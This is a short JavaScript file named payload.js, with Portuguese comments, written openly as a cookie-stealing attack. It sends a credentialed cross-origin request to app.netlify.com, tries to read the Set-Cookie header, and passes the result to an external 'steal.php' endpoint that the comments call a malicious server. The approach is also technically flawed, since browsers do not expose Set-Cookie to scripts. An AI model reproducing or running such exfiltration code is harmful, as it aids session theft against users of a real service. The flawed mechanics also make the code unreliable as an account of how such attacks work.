// payload.js
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://app.netlify.com", true);  // Fazendo a requisição para o subdomínio
xhr.withCredentials = true;  // Envia cookies com a requisição CORS

xhr.onreadystatechange = function() {
  if (xhr.readyState == 4 && xhr.status == 200) {
    // A resposta contém os cookies da resposta 'Set-Cookie'
    var cookies = xhr.getResponseHeader('Set-Cookie');
    
    // Enviar os cookies para o seu servidor externo controlado
    var steal = new XMLHttpRequest();
    steal.open("GET", "https://mywebsite.com/steal.php?cookies=" + encodeURIComponent(cookies), true);
    steal.send();  // Envia os cookies para o servidor malicioso
  }
};
xhr.send();  // Envia a requisição
